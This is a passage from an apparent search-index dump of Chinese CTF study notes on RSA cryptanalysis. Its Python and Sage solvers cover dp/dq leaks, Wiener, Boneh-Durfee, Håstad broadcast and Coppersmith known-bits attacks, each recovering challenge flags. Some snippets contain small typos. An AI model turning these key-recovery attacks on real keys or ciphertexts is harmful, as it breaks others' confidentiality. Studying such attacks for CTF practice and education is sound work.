<p>Question</p> <p>cryptohack - Crossed Wires</p> <pre><code># rsatool \u5206\u89e3\u5f97\u5230\np \u00a0= 0xbf7a6a86c980cbc7ff358a92b7b0828106b6ad75122c42b9c05cfb0f1b08205903e54381a323b3c2dfc6a6adb0771dbdf61185405ec7e1de5614cdfa71c6b5cd320d0a6bc40379592088a794b0ead8cc012a38ca57daaed140c42c634736eee8fe268bac6ab814b1e769dc1bade805160da940b0813b145df9b7a97e7ca4e0eb\n\nq = 0xe5f0c56af9d879da10d5b7f09153716469faced27adf10a8c69847e2460767d316048b95087bf1102278ca070e2fb81ac367aae538980ad0cbd438ffac3673c9b8898a24209d896723a9b08e919a6cbfff761cb8218df0d1f6f56414ba245ad17581d96bca6679b3fa7a2a7d2306ad99c1749864cd85b3390aaddef33e8c73b9\n\nn = p*q\nphi = (p-1)*(q-1)\nc = 20304610279578186738172766224224793119885071262464464448863461184092225736054747976985179673905441502689126216282897704508745403799054734121583968853999791604281615154100736259131453424385364324630229671185343778172807262640709301838274824603101692485662726226902121105591137437331463201881264245562214012160875177167442010952439360623396658974413900469093836794752270399520074596329058725874834082188697377597949405779039139194196065364426213208345461407030771089787529200057105746584493554722790592530472869581310117300343461207750821737840042745530876391793484035024644475535353227851321505537398888106855012746117\nfriends_key = [...]\nphi = (p-1)*(q-1)\nfrom Crypto.Util.number import inverse, long_to_bytes\nfor key in friends_key[::-1]:\n    e = key[1]\n    d = inverse(e, phi)\n    c = pow(c, d, N)\nlong_to_bytes(c) # b'crypto{3ncrypt_y0ur_s3cr3t_w1th_y0ur_fr1end5_publ1c_k3y}'\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#dp-dq-leak-attack","title":"dp || dq leak attack","text":"<p>Definition</p> <p>\\(dp \\equiv d\\pmod{p-1}, dq \\equiv d\\pmod{q-1}\\)</p> <p>\u653b\u51fb\u6761\u4ef6\uff1a\u76f4\u5230 dp \u6216\u8005 dq\uff0c\u5b8c\u6574\u7684\u516c\u94a5 (n,e) \u548c\u5bc6\u6587 c\u3002 \u653b\u51fb\u539f\u7406\uff1a\\(p = \\frac{edp-1}{i}+1, i \\in[1, e]\\) \uff0c\u63a8\u5bfc\u7701\u7565\uff0c\u53ea\u8981 p \u662f\u6574\u6570\u4e14\u6574\u9664 n \u5373\u7b26\u5408\u6761\u4ef6\uff1a</p> demo_dp_leak<pre><code>from Crypto.Util.number import getPrime\nm = int.from_bytes(b'darctf{wow_leaking_dp_breaks_rsa?}')\np = getPrime(1024)\nq = getPrime(1024)\nn = p*q\ne = 0x10001\nc = pow(m,e,n)\nphi = (p-1)*(q-1)\nd = pow(e,-1,phi)\ndp = d % (p-1)\nprint(dp, n, e, c)\n\n\"\"\"solve\"\"\"\ndef dp_attack(dp, n, e):\n    for i in range(1,e):\n        if (dp*e-1)%i==0 and n%(((dp*e-1)//i)+1)==0:\n            return ((dp*e-1)//i)+1\n\np = dp_attack(dp, n, e)\nq = n//p\nphi = (p-1)*(q-1)\nd = pow(e,-1,phi)\nm = pow(c,d,n)\nprint(bytes.fromhex(hex(m)[2:]))\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#dp-dq-leak-attack_1","title":"dp &amp;&amp; dq leak attack","text":"<p>\u653b\u51fb\u6761\u4ef6\uff1a\u77e5\u9053 dp, dp, p, q, c\u3002 \u653b\u51fb\u539f\u7406\uff1acrt \u6c42\u89e3 d\u3002</p> dpq_leak<pre><code>from sage.all import crt\n\np = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 \nq = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 \ndp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 \ndq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 \nc = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852\n\ndef dpq_attack(p,q,dp,dq):\n    return crt([dp,dq],[p-1,q-1])\nd = dpq_attack(p,q,dp,dq)\nn=p*q\nm=pow(c,d,n)\nbytes.fromhex(hex(m)[2:])\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#dp-dq-dr-leak-attack","title":"dp &amp;&amp; dq &amp;&amp; dr leak attack","text":"<p>\u653b\u51fb\u6761\u4ef6\uff1a</p> \\[ n = p*q*r, \\begin{cases} dp = d\\pmod{(q-1)*(r-1)} \\\\ dq = d\\pmod{(p-1)*(r-1)} \\\\ dr = d\\pmod{(p-1)*(q-1)} \\end{cases}, \u4e14\u5df2\u77e5 p,q,r,dp,dq,dr \\] <p>\u8fd8\u662f\u4e00\u6837\u7684 crt\uff1f\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\u8981\u6c42\u6a21\u6570\u4e92\u8d28\uff1b\u6269\u5c55\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\u53ef\u4ee5\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u89e3\u51b3\u8fd9\u4e00\u95ee\u9898\uff08\u5e76\u975e\u4e00\u5b9a\u53ef\u884c\uff09</p> chall.py<pre><code>\"\"\"\nimport gmpy2\nfrom Crypto.Util.number import *\n\np = getPrime(512)\nq = getPrime(512)\nr = getPrime(512)\ne = getPrime(32)\nprint(e)\nn = p*q*r\nphi = (p-1)*(q-1)*(r-1)\nd = gmpy2.invert(e,phi)\ndp = d%((q-1)*(r-1))\ndq = d%((p-1)*(r-1))\ndr = d%((p-1)*(q-1))\nflag = 'flag{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}'\nm = bytes_to_long(flag.encode())\nc = pow(m,e,n)\n\nprint(p)\nprint(q)\nprint(r)\nprint(dp)\nprint(dq)\nprint(dr)\nprint(c)\n\"\"\"\n\nfrom sage.all import crt, CRT_list, gcd\n\np=12922128058767029848676385650461975663483632970994721128398090402671357430399910236576943902580268365115559040908171487273491136108931171215963673857907721\nq=10395910293559541454979782434227114401257890224810826672485874938639616819909368963527556812339196570118998080877100587760101646884011742783881592586607483\nr=8104533688439480164488403019957173637520526666352540480766865791142556044817828133446063428255474375204188144310967625626318466189746446739697284656837499\ndp=73360412924315743410612858109886169233122608813546859531995431159702281180116580962235297605024326120716590757069707814371806343766956894408106019058184354279568525768909190843389534908163730972765221403797428735591146943727032277163147380538250142612444372315262195455266292156566943804557623319253942627829\ndq=40011003982913118920477233564329052389422276107266243287367766124357736739027781899850422097218506350119257015460291153483339485727984512959771805645640899525080850525273304988145509506962755664208407488807873672040970416096459662677968243781070751482234692575943914243633982505045357475070019527351586080273\ndr=21504040939112983125383942214187695383459556831904800061168077060846983552476434854825475457749096404504088696171780970907072305495623953811379179449789142049817703543458498244186699984858401903729236362439659600561895931051597248170420055792553353578915848063216831827095100173180270649367917678965552672673\nc=220428832901130282093087304800127910055992783874826238869471313726515822196746908777026147887315019800546695346099376727742597231512404648514329911088048902389321230640565683145565701498095660019604419213310866468276943241155853029934366950674139215056682438149221374543291202295130547776549069333898123270448986380025937093195496539532193583979030254746589985556996040224572481200667498253900563663950531345601763949337787268884688982469744380006435119997310653\n</code></pre> <p>\u8ba1\u7b97\u6a21\u6570\u95f4\u4e24\u4e24\u4e4b\u95f4\u6700\u5927\u516c\u56e0\u6570\uff0c\u4f5c\u4e3a\u65b0\u7684\u6a21\u6570\u6c42\u89e3\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\uff1a</p> solve1.py<pre><code>M1 = (q - 1)*(r -1)\nM2 = (p -1)*(r -1)\nM3 = (p -1)*(q -1)\n\nG12 = gcd(M1, M2)\nG13 = gcd(M1, M3)\nG23 = gcd(M2, M3)\n\n# \u68c0\u67e5\u540c\u4f59\u65b9\u7a0b\u662f\u5426\u6709\u89e3\nif (dp - dq) % G12 != 0 or (dp - dr) % G13 != 0 or (dq - dr) % G23 != 0:\n    print(\"\u540c\u4f59\u65b9\u7a0b\u65e0\u89e3\")\nelse:\n    d = crt([dp, dq, dr], [M1, M2, M3])\n    m = pow(c, d, p * q * r)\n    print(bytes.fromhex(hex(m)[2:]))\n</code></pre> <p>sagemath \u4e2d\u5185\u7f6e\u4e86 <code>CRT_list</code> \u65b9\u6cd5\u53ef\u4ee5\u6c42\u89e3\u6a21\u6570\u4e0d\u4e92\u8d28\u7684\u60c5\u51b5\uff1a</p> solver2.py<pre><code>d = CRT_list([dp,dq,dr],[(q-1)*(r-1),(p-1)*(r-1),(p-1)*(q-1)])\nm = pow(c,d,p*q*r)\nbytes.fromhex(hex(m)[2:]) # b'DASCTF{8ec820e5251db6e7a1758543a1123824}'\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#wieners-attack","title":"Wiener's Attack \uff08\u7ef4\u7eb3\u653b\u51fb\uff09","text":"<p>\u653b\u51fb\u4f7f\u7528\u4e8e\uff1ae \u8f83\u5927\uff0c\\(d&lt; \\frac{1}{3}N^{1/4}, q&lt;p&lt;2q\\) \u3002</p> <p>\u539f\u7406\u7b80\u8ff0\uff1a\u7531\u4e8e \\(ed \\equiv 1\\pmod{\\phi(n)} \\implies ed = k*\\phi + 1\\) \uff0c\u5f53 n \u8f83\u5927\u65f6\uff0c\\(ed \\approx k*\\phi \\approx k*n\\implies \\frac{e}{n} \\approx \\frac{k}{d}\\)  \uff1b\u5229\u7528\u8fde\u5206\u6570\u4ece\u4e24\u4fa7\u903c\u8fd1\u4e8e\u6781\u9650\u503c\u7684\u7279\u70b9\uff0c\u627e\u5230\u771f\u6b63\u7684 d &amp; k \uff1b\u751a\u81f3\u6211\u4eec\u6c42\u89e3 \\(\\phi\\) \u540e\u80fd\u591f\u5206\u89e3\u51fa p/q \u3002 </p> <p>\u653b\u51fb\u4ee3\u7801\u53ef\u4ee5\u4f7f\u7528 crypto-attacks/attacks/rsa/wiener_attack.py \uff0c\u4e0b\u9762\u662f\u4e00\u4e2a\u4f7f\u7528\u793a\u4f8b\uff1a</p> wiener_attack.py<pre><code>import os\nimport sys\n\nfrom sage.all import ZZ\nfrom sage.all import continued_fraction\n\npath = os.path.dirname(os.path.dirname(os.path.dirname(os.path.realpath(os.path.abspath(__file__)))))\nif sys.path[1] != path:\n    sys.path.insert(1, path)\n\nfrom attacks.factorization import known_phi\n\ndef attack(N, e):\n    \"\"\"\n    Recovers the prime factors of a modulus and the private exponent if the private exponent is too small.\n    :param N: the modulus\n    :param e: the public exponent\n    :return: a tuple containing the prime factors and the private exponent, or None if the private exponent was not found\n    \"\"\"\n    convergents = continued_fraction(ZZ(e) / ZZ(N)).convergents()\n    for c in convergents:\n        k = c.numerator()\n        d = c.denominator()\n        if pow(pow(2, e, N), d, N) != 2:\n            continue\n\n        phi = (e * d - 1) // k\n        factors = known_phi.factorize(N, phi)\n        if factors:\n            return *factors, int(d)\n\n# set the value we need to know\nn = 10117654819914858266933329374955416887632623769133893090370644563766857602175135282123557069130319485164837923640109707980173187311717714731455048711732890650502393864146567993461691536083330111489342144526034765633893707639465391971659424271400604010051260552831236934617979897198594708643604050329358522040572553492557329327193918343289526476096522685686128709365882540965089876020772451339243051387630968483513100881164719486794479191020450727996212211201807165531274853014517030221518336293845148545671493267736094904720639061287350709209363413742534108909427583009442175135992281621755221466312230819838164838443\ne = 9821176723459156737162590528498355378679103255669217165700920581299681706733929195884953659518540987340485400582895899813962495604183457377106880733695051072483080763292039235986138262683331839202120494074112671026731661652894069539798773005571447249078493499067926710777981456836165288713067372341722891618455469381820299718375899142104630769808052209736800306823537530231432735329122809506084509365041929994661643608897946882821172042151091436805833261237973879388223150132281413026451714557979869417700194664385291198650864896408143681530963859508908402067374010247738488460155501935400209160082801993945408813513\nc = 838279327100183842450828959704405383407020841408916285706333834213457887909003957632210005175559669378601653437817015283864372967567045814324446631403131762020243676699045950634510503063630325940620012467503745448306616066932850616255337850567483377961974904557893440882626053258665407295455129124436515237709284339335286446533668177967589716697626618148973094630870394728363810896842456940427809475399274556698585866672673971202275767545143765482579343055060966723452080734906835537296838390574697520016738791840483248208135607782781572593502322902003706653541803004568389346187087997006034664608287414331955367370\np, q, d = attack(n, e)\nm = pow(c, d, n)\nprint(m)\nprint(bytes.fromhex(hex(m)[2:])) # b\"SKSEC{Do_y0u_Kn0w_Wi3n3r's_4ttack}\"\n</code></pre> <p>Example</p> <ul> <li>[CISCN 2022 \u4e1c\u5317\u8d5b\u533a]math</li> </ul>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#boneh-and-durfee-attack","title":"Boneh and Durfee attack","text":"<p>\u653b\u51fb\u6761\u4ef6\uff1a\\(d&lt;N^{0.292}\\)</p> <p>\u5148\u6765\u770b cryptohack \u4e0a\u7684 <code>Everything is Still Big</code> </p> task.py<pre><code>#!/usr/bin/env python3\n\nfrom Crypto.Util.number import getPrime, bytes_to_long, inverse\nfrom random import getrandbits\nfrom math import gcd\n\nFLAG = b\"crypto{?????????????????????????????????????}\"\n\nm = bytes_to_long(FLAG)\n\ndef get_huge_RSA():\n    p = getPrime(1024)\n    q = getPrime(1024)\n    N = p*q\n    phi = (p-1)*(q-1)\n    while True:\n        d = getrandbits(512)\n        if (3*d)**4 &gt; N and gcd(d,phi) == 1:\n            e = inverse(d, phi)\n            break\n    return N,e\n\n\nN, e = get_huge_RSA()\nc = pow(m, e, N)\n\nprint(f'N = {hex(N)}')\nprint(f'e = {hex(e)}')\nprint(f'c = {hex(c)}')\n</code></pre> <p>\u5f88\u7279\u522b\u7684\u8981\u6c42 <code>(3*d)**4 &gt; N</code> \uff0c\u628a Wiener-attack \u7981\u7528\u4e86\uff1b\u4f46\u662f\u6709\u66f4\u5f3a\u7684\u653b\u51fb Boneh and Durfee attack (\\(d&lt;N^{0.292}\\))</p> <p>ctf-wiki - Boneh and Durfee attack</p> <p>boneh_durfee.sage</p> final.py<pre><code>d = 4405001203086303853525638270840706181413309101774712363141310824943602913458674670435988275467396881342752245170076677567586495166847569659096584522419007\nN = 0xb12746657c720a434861e9a4828b3c89a6b8d4a1bd921054e48d47124dbcc9cfcdcc39261c5e93817c167db818081613f57729e0039875c72a5ae1f0bc5ef7c933880c2ad528adbc9b1430003a491e460917b34c4590977df47772fab1ee0ab251f94065ab3004893fe1b2958008848b0124f22c4e75f60ed3889fb62e5ef4dcc247a3d6e23072641e62566cd96ee8114b227b8f498f9a578fc6f687d07acdbb523b6029c5bbeecd5efaf4c4d35304e5e6b5b95db0e89299529eb953f52ca3247d4cd03a15939e7d638b168fd00a1cb5b0cc5c2cc98175c1ad0b959c2ab2f17f917c0ccee8c3fe589b4cb441e817f75e575fc96a4fe7bfea897f57692b050d2b\nc = 0xa3bce6e2e677d7855a1a7819eb1879779d1e1eefa21a1a6e205c8b46fdc020a2487fdd07dbae99274204fadda2ba69af73627bdddcb2c403118f507bca03cb0bad7a8cd03f70defc31fa904d71230aab98a10e155bf207da1b1cac1503f48cab3758024cc6e62afe99767e9e4c151b75f60d8f7989c152fdf4ff4b95ceed9a7065f38c68dee4dd0da503650d3246d463f504b36e1d6fafabb35d2390ecf0419b2bb67c4c647fb38511b34eb494d9289c872203fa70f4084d2fa2367a63a8881b74cc38730ad7584328de6a7d92e4ca18098a15119baee91237cea24975bdfc19bdbce7c1559899a88125935584cd37c8dd31f3f2b4517eefae84e7e588344fa5\n\nm = pow(c, d, N)\nprint(bytes.fromhex(hex(m)[2:])) # b'crypto{bon3h5_4tt4ck_i5_sr0ng3r_th4n_w13n3r5}'\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#coppersmiths-relative-attack","title":"Coppersmith's relative attack","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#hastads-broadcast-attack","title":"H\u00e5stad's broadcast attack","text":"<p>\u53d1\u9001\u65b9\u5c06\u4e00\u4efd\u660e\u6587\u8fdb\u884c\u591a\u4efd\uff08\u4efd\u6570 k &gt; e\uff09\u52a0\u5bc6\uff0c\u6bcf\u4efd\u4f7f\u7528\u4e0d\u540c\u7684 n\uff08\u5982 \\(n_{1}, n_{2}, \\dots\\)\uff09\uff0c\u663e\u7136\u53ef\u4ee5\u4f7f\u7528\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\u89e3\u51fa \\(c = m^e\\pmod{n_{1}*n_{2}*\\dots}\\)\uff1b\u800c\u663e\u7136 m &lt; n1 &amp; m &lt; n2 &amp; ... \uff0c\u6240\u4ee5\u5f53 e \u7684\u503c\u5c0f\u4e8e\u7b49\u4e8e\u6211\u4eec\u83b7\u5f97\u7684\u5bc6\u6587\u6570\u91cf\uff0c\u5c31\u4f1a\u6709 \\(m^e \\leq \\Pi_{i=0}^{k}n_{i}\\) \uff0c\u6b64\u65f6\u76f4\u63a5\u5f00\u6839\u5c31\u597d\u4e86\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u4e2a e \u7b49\u4e8e 3\u3002</p> <pre><code>from sage.all import *\nmsg = [{'c':xxx, 'e':xxx, n:xxx}, ...] # \u5b57\u5178\u5217\u8868\n# \u63d0\u53d6\u6240\u6709\u7684n\u548cc\nlength = len(msg)\nns = [msg[i][\"n\"] for i in range(length)]\ncs = [msg[i][\"c\"] for i in range(length)]\n\n# \u4f7f\u7528CRT\u6c42\u89e3m^length\nm_power = crt(cs, ns)\nm = int(m_power.nth_root(lengt))\n\nflag = bytes.fromhex(hex(m)[2:]).decode()\nprint(flag)\n</code></pre> <p>\u5982\u679c\u662f\u5f88\u591a\u7ec4 (n, e, c) \u4e2d\uff0c\u90e8\u5206\u5bf9\u5e94\u660e\u6587\u76f8\u540c\uff0c\u53ef\u4ee5\u6539\u4e3a\u4e0b\u9762\u7684\u4ee3\u7801\uff1a</p> <pre><code>from sage.all import *\nfrom itertools import combinations\nmax_length = len(ns)\nfor l in range(e, max_length+1):\n    for comb in combinations(range(max_length), l):\n        ncs = [cs[i] for i in comb]\n        nns = [ns[i] for i in comb]\n        m_power = crt(ncs, nns)\n        try:\n            m = int(m_power.nth_root(e))\n            pt = bytes.fromhex(hex(m)[2:])\n            if b'flag' in pt:\n                print(pt)\n                print(comb)\n        except:\n            continue\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#franklinreiter-related-message-attack","title":"Franklin\u2013Reiter related-message attack","text":"<p>\u653b\u51fb\u6761\u4ef6\uff1a\u4f7f\u7528\u540c\u4e00\u516c\u94a5 (n, e) \u7ebf\u6027\u586b\u5145\u52a0\u5bc6\u540c\u4e00\u5bc6\u6587 m \u4e24\u6b21\uff0c\u83b7\u5f97\u4e24\u4e2a\u5bc6\u6587 c1 c2:</p> related-message<pre><code>class Challenge:\n    def __init__(self):\n        self.p = getPrime(1024)\n        self.q = getPrime(1024)\n        self.N = self.p * self.q\n        self.e = 11\n\n    def pad(self, flag):\n        m = bytes_to_long(flag)\n        a = random.randint(2, self.N)\n        b = random.randint(2, self.N)\n        return (a, b), a * m + b\n\n    def encrypt(self, flag):\n        pad_var, pad_msg = self.pad(flag)\n        encrypted = (pow(pad_msg, self.e, self.N), self.N)\n        return pad_var, encrypted\n</code></pre> \\[ \u6784\u9020\u4e24\u4e2a\u591a\u9879\u5f0f\\begin{cases} p_1(x)=(a_1x+b_1)^e-c_1\\quad\\mathrm{mod~}N\\\\ p_2(x)=(a_2x+b_2)^e-c_2\\quad\\mathrm{mod~}N \\end{cases} \\] <p>\u4e0d\u96be\u53d1\u73b0\u4e8c\u8005\u90fd\u6709 (x-m) \u8fd9\u4e00\u56e0\u5f0f\uff0c\u63d0\u53d6\u51fa\u6765\u540e\u6c42\u89e3\u5373\u53ef\u5f97\u5230 m\u3002</p> <p>Question</p> <p>cryptohack - Bespoke Padding</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#coppersmiths-short-pad-attack","title":"Coppersmith\u2019s short-pad attack","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#known-high-bits-attack","title":"Known High Bits Attack","text":"<p>\u5229\u7528 sagemath \u8c03\u7528\u7684 coppersmith \u7b97\u6cd5\u6c42\u89e3\u5c0f\u6839\u3002</p> <p>\u653b\u51fb\u6761\u4ef6\uff1a\u5df2\u77e5 N \u7684\u4e00\u4e2a\u7d20\u6570 p/q \u7684\u9ad8\u4f4d\u6216\u8005\u662f\u660e\u6587\u7684\u9ad8\u4f4d\uff1b \u653b\u51fb\u65b9\u5f0f\uff1a\u6784\u9020\u591a\u9879\u5f0f\uff0c\u8c03\u7528 sagemath \u6c42\u89e3\u3002</p> known_bits<pre><code>from sage.all import *\nfrom Crypto.Util.number import getPrime\nm1 = int.from_bytes(b'darctf{p_high_bits_leak}')\nm2 = int.from_bytes(b'darctf{m_high_bits_leak}')\ne1 = 65537\ne2 = 11\nprint(f\"e2 = {e2}\")\np = getPrime(1024)\nq = getPrime(1024)\nn = p * q\nc1 = pow(m1, e1, n)\nc2 = pow(m2, e2, n)\nprint(f'n = {n}')\nprint(f\"e = {e}\")\n\n\"\"\" Known High Bits Message Attack \"\"\"\nshift1 = 128\np_high = p &gt;&gt; shift1 &lt;&lt; shift1\nprint(f\"p_high = {p_high}\")\nprint(f'c1 = {c1}')\n\n\"\"\" Factoring with High Bits Known \"\"\"\nshift2 = 128\nm_high = m2 &gt;&gt; 128 &lt;&lt; 128\nprint(f\"m_high = {m_high}\\n{bytes.fromhex(hex(m_high)[2:])}\")\nprint(f'c2 = {c2}')\n\n\"\"\"solve\"\"\"\nx = Zmod(n)['x'].gen()\n\"\"\" part 1 \"\"\"\n# x1 = p-p_high =&gt; x1+p_higt % p == 0\nf1 = x + p_high\nroot1 = f1.small_roots(X=2**shift1, beta=0.4)\nfor root in root1:\n    root = int(root)\n    if n % (root + p_high) == 0:\n        p = root + p_high\n        q = n // p\n        break\nd1 = pow(e1, -1, (p-1)*(q-1))\nprint(bytes.fromhex(hex(pow(c1, d1, n))[2:]))\n\"\"\" part 2 \"\"\"\n# x2 = m-m_high =&gt; x2+m_high = m =&gt; (x2+m_high)^e - c2 == 0\nf2 = (x + m_high)**e2 - c2\nroot2 = f2.small_roots(X=2**shift2, beta=0.4)\nif root2:\n    for root in root2:\n        print(bytes.fromhex(hex(root+m_high)[2:]))\nelse:\n    print(\"No root found\")\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#known-low-bits-attack","title":"Known Low Bits Attack","text":"known low bits<pre><code>from sage.all import *\nfrom Crypto.Util.number import getPrime\np, q = getPrime(1024), getPrime(1024)\nn = p*q\nprint(f\"n = {n}\")\n\n\"\"\" known p low bits \"\"\"\nm1 = int.from_bytes(b'darctf{p_low_bits_leak}')\nshift1 = 128\np_low = p &amp; ((1 &lt;&lt; shift1)-1)\ne1 = 0x10001\nc1 = pow(m1, e1, n)\nprint(f\"e1 = {e1}\")\nprint(f\"c1 = {c1}\")\nprint(f\"p_low = {p_low}\")\nlen_p = len(bin(p))\nprint(f'len(bin(p)) = {len_p}')\n\n\"\"\" known m low bits \"\"\"\nm2 = int.from_bytes(b'darctf{m_low_bits_leak}')\nshift2 = 128\nm_low = m2 &amp; ((1 &lt;&lt; shift2)-1)\ne2 = 11\nc2 = pow(m2, e2, n)\nlen_m = len(bin(m2))\nprint(f\"e2 = {e2}\")\nprint(f\"c2 = {c2}\")\nprint(f\"len(bin(m2)) = {len_m}\")\nprint(f'm_low = {m_low}')\n\n\"\"\" solve \"\"\"\nx = PolynomialRing(Zmod(n), 'x', implementation=\"NTL\").gen()\n\"\"\" part p \"\"\"\n# x1* 1&lt;&lt;shift1 = p-p_lo2 =&gt; (x1**shift1 + p_low) % p == 0\nf1 = (x*(1&lt;&lt;shift1) + p_low - n).monic()\nroot1 = f1.small_roots(X=2**(len_p-2-shift1), beta=0.4)\nif root1:\n    for root in root1:\n        root = int(root*(1 &lt;&lt; shift1))\n        p = root + p_low\n        q = n // p\n        d1 = pow(e1, -1, (p-1)*(q-1))\n        print(bytes.fromhex(hex(pow(c1, d1, n))[2:]))\n        break\nelse:\n    print('root1 not found')\n\n\n\"\"\" part m \"\"\"\n# x2* 1&lt;&lt;shift2 = m-m_low =&gt; (x2**shift2 + m_low)**e - c == 0\nf2 = (((1 &lt;&lt; shift2) * x + m_low)**e2 - c2).monic()\nroot2 = f2.small_roots(X=2**(len_m-2-shift2), beta=0.5)\nif root2:\n    for root in root2:\n        root = int(root*(1 &lt;&lt; shift2))\n        print(bytes.fromhex(hex(root + m_low)[2:]))\n        break\nelse:\n    print('root2 not found')\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#return-of-coppersmiths-attack-roca","title":"Return of Coppersmith's attack (ROCA)","text":"<p>\u653b\u51fb\u6761\u4ef6\uff1afast primes</p> <p>\u8d77\u6e90\u4e8e cryptohack \u4e0a\u7684 \"Fast Primes\"\uff0c\u5f53\u7136\u53bb\u641c Fast Primes \u4e5f\u80fd\u627e\u5230\u8fd9\u4e2a\u653b\u51fb\uff08\u65b9\u4fbf\u548c\u5b89\u5168\u603b\u662f\u96be\u4ee5\u517c\u5f97\u7684\uff09\uff0c\u5177\u4f53\u4e0b\u9762\u7684\u6587\u7ae0\u8bb2\u7684\u5f88\u6e05\u695a\u4e86\uff0c\u63a8\u8350\u653b\u51fb\u811a\u672c\u5982\u4e0b\uff0c\u81ea\u5df1\u6709\u80fd\u529b\u5199\u4e00\u4e2a\u66f4\u597d\u3002</p> <p>Note</p> <ul> <li> <p>Analysis of the ROCA vulnerability</p> </li> <li> <p>https://github.com/RsaCtfTool/RsaCtfTool/blob/master/sage/roca_attack.py</p> </li> </ul>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#_10","title":"\u5176\u4ed6","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#m","title":"m \u7684\u89e3\u4e2a\u6570","text":"<p>Theorem</p> <p>If \\(gcd(e, p-1)=1\\) and p is prime, the \\(m^e \\equiv c\\pmod{p}\\) has exactly one solution for m.</p> <p>elementary number theory - solutions to \\(x^n\\equiv a\\pmod{p}\\) - Mathematics Stack Exchange</p> <p>\u5176\u5b9e\u66f4\u4e3a\u91cd\u8981\u7684\u662f\u4e0a\u9762\u95ee\u7b54\u4e2d\u8f83\u4e3a\u9760\u4e0b\u7684\u4e00\u4e2a\u56de\u7b54\u7ed9\u51fa\u7684\u7ed3\u8bba\uff1a</p> <p>Theorem</p> <p>If p is prime, \\(p \\nmid c\\), then \\(m^e \\equiv c \\pmod{p}\\) has 0 or d = gcd(e, p-1) solutions, being the latter if \\(c^{\\frac{p-1}{d}}\\equiv 1 \\pmod{p}\\).</p> <p>\u8bc1\u660e\u7565\uff0c\u5176\u4e2d\u6700\u540e\u4e00\u4e24\u6b65\u5982\u679c\u770b\u4e0d\u61c2\u53ef\u4ee5\u53c2\u8003 group theory - Solution to \\(x^n=a \\pmod p\\) where \\(p\\) is a prime .</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#optimal-asymmetric-encryption-padding-oaep","title":"Optimal asymmetric encryption padding (OAEP)","text":"<p>https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#get-p-q-if-we-know-phi","title":"Get p q if we know phi","text":"\\[ \\begin{cases}p+q=n-\\varphi(n)+1\\\\p-q=\\sqrt{\\left(n-\\varphi(n)+1\\right)^2-4n}\\end{cases} \\]","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#_11","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>crypto-attack/attack/rsa</li> <li>RSA\u5b66\u4e60\u7b14\u8bb0 | Chemtrails (ch3mtr4ils.cn)</li> <li>CTF RSA\u9898\u89e3\u96c6</li> </ul> <ol> <li> <p>\u53ef\u80fd\u662f\u7531\u4e8e\u4e24\u6b21\u4f7f\u7528\u7684 n \u4e0d\u540c\uff0cm \u6240\u5728\u7684\u6709\u9650\u57df\u4e0d\u540c\u5bfc\u81f4\u7684\uff08\u731c\u6d4b\uff09\u3002\u00a0\u21a9\u21a9</p> </li> <li> <p><code>&lt;=</code> \u8868\u793a\u7684\u662f\u8d4b\u503c\uff0c\u5e76\u975e <code>\u2264</code> \u3002\u00a0\u21a9</p> </li> </ol>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/padding_oracle_attack/","title":"Padding oracle attack","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/padding_oracle_attack/#intro","title":"Intro","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/padding_oracle_attack/#padding-oracle-attack","title":"\u586b\u5145\u9884\u8a00\u673a\u653b\u51fb\uff08Padding Oracle 